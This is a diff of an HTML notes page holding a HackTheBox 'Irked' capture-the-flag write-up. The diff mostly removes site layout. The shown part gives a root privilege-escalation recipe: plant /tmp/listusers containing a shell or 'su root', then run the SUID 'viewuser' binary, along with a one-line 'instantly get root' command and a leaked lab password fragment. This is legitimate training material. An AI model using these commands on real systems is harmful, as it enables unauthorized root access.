@@ -1,32 +1,5 @@
 <html>
-  <head>
-    <!-- meta things -->
-    <meta name=viewport content="width=device-width, initial-scale=1">
-    <title><!--*NOTENAME*--> - Nathan Higley</title>
-    <link rel="canonical" href="https://nathanhigley.com" />
-    <!-- end meta things -->
-  
-    <!-- favicon code -->
-    <link rel="apple-touch-icon" sizes="180x180" href="../../images/apple-touch-icon.png">
-    <link rel="icon" type="image/png" sizes="32x32" href="../../images/favicon-32x32.png">
-    <link rel="icon" type="image/png" sizes="16x16" href="../../images/favicon-16x16.png">
-    <link rel="manifest" href="../../images/site.webmanifest">
-    <link rel="shortcut icon" href="../../images/favicon.ico">
-    <meta name="msapplication-TileColor" content="#2b5797">
-    <meta name="msapplication-config" content="../../images/browserconfig.xml">
-    <meta name="theme-color" content="#ffffff">
-    <!-- end favicon code -->
-  
-    <!-- style sheets -->
-    <link rel="stylesheet" href="../../style-sheets/styles.css">
-    <link rel="stylesheet" href="../../style-sheets/bootstrap-grid.css">
-    <link rel="stylesheet" href="....//style-sheets/bootstrap-grid-min.css">
-    <link rel="stylesheet" href="....//style-sheets/bootstrap-reboot.css">
-    <link rel="stylesheet" href="../../style-sheets/bootstrap-reboot-min.css">
-    <link rel="stylesheet" href="../../style-sheets/fontawesome.css">
-    <link rel="stylesheet" href="../../style-sheets/fonts.css">
-    <!-- end style sheets -->
-
+               <head>
                  <base href="file://C:\Users\Nadeh\Coding\nadehi18.github.io-dev-notes\notes\note-files\HackTheBox-Irked.html/">
                  <meta charset="UTF-8">
                  <meta name = "viewport" content = "width = device-width, initial-scale = 1, maximum-scale = 1">
@@ -1316,25 +1289,7 @@ body p {
 </style>
                  <link rel="stylesheet" href="../css/dracula.css"><link rel="stylesheet" href="../css/katex.min.css"><link rel="stylesheet" href="../css/codemirror.css"><link rel="stylesheet" href="../css/main.min.css">
                </head>
-               <body class="note-body">
-
-                <!-- nav code -->
-                <nav>
-                  <ul class="note-header">
-                    <li class="nav"><a class="nav" href="../../../index.html#home"><i class="fas fa-igloo"></i><span class="labels"> Home</span></a></li>
-                    <li class="nav"><a class="nav" href="../../../index.html#about"><i class="fas fa-info-circle"></i><span class="labels"> About</span></a></li>
-                    <li class="nav"><a class="nav" href="../../../index.html#work"><i class="fas fa-desktop"></i><span class="labels"> Work</span></a></li>
-                    <li class="nav"><a class="nav" href="../../../index.html#contact"><i class="fas fa-address-card"></i><span class="labels"> Contact</span></a></li>
-                    <li class="nav"><a class="nav" href="../../notes.html"><i class="fas fa-sticky-note"></i><span class="labels"> Notes</span></a></li>
-                  </ul>
-                </nav>
-                <!-- end nav code -->
-                <div class="d-flex" >
-                  <div class="container-fluid">
-                    <div class="row">
-                      <div class="col-lg-12 note-spacer"></div>
-                      <div class="col-lg-12">
-                 <h1 id="HackTheBox---Irked" data-line="1">HackTheBox - Irked</h1>
+               <body><h1 id="HackTheBox---Irked" data-line="1">HackTheBox - Irked</h1>
 <blockquote data-line="3">
 <p data-line="3">MACHINE IP: 10.10.10.117</p>
 </blockquote>
@@ -1422,21 +1377,16 @@ pass = Kab6h+m+bbp2J:HG</p>
 <p data-line="79">Method to obtain root:</p>
 </blockquote>
 <pre class="code CodeMirror cm-s-dracula" data-line="80">        <span class="filename"></span>
-        <span class="lineNumber CodeMirror-gutters"><span class="CodeMirror-linenumber">1</span><span class="CodeMirror-linenumber">2</span><span class="CodeMirror-linenumber">3</span><span class="CodeMirror-linenumber">4</span><span class="CodeMirror-linenumber">5</span><span class="CodeMirror-linenumber">6</span><span class="CodeMirror-linenumber">7</span><span class="CodeMirror-linenumber">8</span><span class="CodeMirror-linenumber">9</span><span class="CodeMirror-linenumber">10</span><span class="CodeMirror-linenumber">11</span></span>
-        <code class="">
---&gt; touch /tmp/listusers
+        <span class="lineNumber CodeMirror-gutters"><span class="CodeMirror-linenumber">1</span><span class="CodeMirror-linenumber">2</span><span class="CodeMirror-linenumber">3</span><span class="CodeMirror-linenumber">4</span><span class="CodeMirror-linenumber">5</span></span>
+        <code class="">--&gt; touch /tmp/listusers
 --&gt; echo "/bin/bash" &gt; /tmp/listusers 
 --&gt; chmod 7777 /tmp/listusers 
 --&gt; viewuser
 --&gt; rm /tmp/listusers
 </code>
-      <i><button class="clipboardButton"><svg width="13" height="13" viewBox="0 0 1792 1792"><path d="M768 1664h896v-640h-416q-40 0-68-28t-28-68v-416h-384v1152zm256-1440v-64q0-13-9.5-22.5t-22.5-9.5h-704q-13 0-22.5 9.5t-9.5 22.5v64q0 13 9.5 22.5t22.5 9.5h704q13 0 22.5-9.5t9.5-22.5zm256 672h299l-299-299v299zm512 128v672q0 40-28 68t-68 28h-960q-40 0-68-28t-28-68v-160h-544q-40 0-68-28t-28-68v-1344q0-40 28-68t68-28h1088q40 0 68 28t28 68v328q21 13 36 28l408 408q28 28 48 76t20 88z"></path></svg></button></i></pre><h3 id="Command-to-Instantly-Get-Root" data-line="94">Command to Instantly Get Root</h3>
-<blockquote data-line="95">
-<p data-line="95">–&gt; touch /tmp/listusers &amp;&amp; echo “su root” &gt; /tmp/listusers &amp;&amp; chmod +x /tmp/listusers &amp;&amp; viewuser</p>
+      <i><button class="clipboardButton"><svg width="13" height="13" viewBox="0 0 1792 1792"><path d="M768 1664h896v-640h-416q-40 0-68-28t-28-68v-416h-384v1152zm256-1440v-64q0-13-9.5-22.5t-22.5-9.5h-704q-13 0-22.5 9.5t-9.5 22.5v64q0 13 9.5 22.5t22.5 9.5h704q13 0 22.5-9.5t9.5-22.5zm256 672h299l-299-299v299zm512 128v672q0 40-28 68t-68 28h-960q-40 0-68-28t-28-68v-160h-544q-40 0-68-28t-28-68v-1344q0-40 28-68t68-28h1088q40 0 68 28t28 68v328q21 13 36 28l408 408q28 28 48 76t20 88z"></path></svg></button></i></pre><h3 id="Command-to-Instantly-Get-Root" data-line="88">Command to Instantly Get Root</h3>
+<blockquote data-line="89">
+<p data-line="89">–&gt; touch /tmp/listusers &amp;&amp; echo “su root” &gt; /tmp/listusers &amp;&amp; chmod +x /tmp/listusers &amp;&amp; viewuser</p>
 </blockquote>
-</div></div></div></div>
-<!--footer code-->
-<footer><p>&copy; 2020 Nathan Higley. All rights reserved.</p></footer>
-<!-- end footer code-->
 </body>
             </html>
